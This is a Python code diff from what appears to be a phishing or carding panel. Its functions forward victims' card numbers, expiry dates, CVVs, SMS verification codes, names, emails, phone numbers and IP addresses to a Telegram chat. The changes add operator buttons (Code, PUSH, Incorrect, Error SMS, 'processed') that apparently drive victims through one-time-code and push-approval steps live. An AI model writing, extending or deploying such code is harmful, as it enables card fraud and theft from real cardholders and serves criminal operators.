@@ -28,14 +28,34 @@ def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
     text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
     bot.send_message(chat_id=CHAT_ID, text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
 
-def send_me1(card, date, cvv):
+def send_me1(card, date, cvv, ID):
     bot = Bot(token=api)
-    text = escape_reserved_characters(f'🃏  `{card}`\n⏰  `{date}`\n🗄 `{cvv}`')
-    bot.send_message(chat_id='-4231677984', text=text, parse_mode='MarkdownV2')
-def send_sms1(card, sms):
+    keyboard = [
+        [
+            InlineKeyboardButton("📱Code📱", callback_data='button1'),
+        ],
+        [
+            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
+            InlineKeyboardButton("💳Incorrect💳", callback_data='button4'),
+        ],
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`')
+    bot.send_message(chat_id='-4231677984', text=text, reply_markup=reply_markup, parse_mode='MarkdownV2')
+
+def send_sms1(card, sms, ID):
     bot = Bot(token=api)
-    text = escape_reserved_characters(f'🃏  `{card}`\n💬 `{sms}`')
-    bot.send_message(chat_id='-4231677984', text=text, parse_mode='MarkdownV2')
+    keyboard = [
+        [
+            InlineKeyboardButton("✅Отработан✅", callback_data='button-ban'),
+            InlineKeyboardButton("Error SMS", callback_data='button2'),
+        ],
+        [
+            InlineKeyboardButton("📲PUSH📲", callback_data='button3'),
+        ],
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    bot.send_message(chat_id='-4231677984', text=escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n\n💬 : `{sms}`'.replace('.', '\.')), reply_markup=reply_markup, parse_mode='MarkdownV2')
 
 def send_me(CHAT_ID, card, date, cvv, ID, ip):
     bot = Bot(token=API_TOKEN)
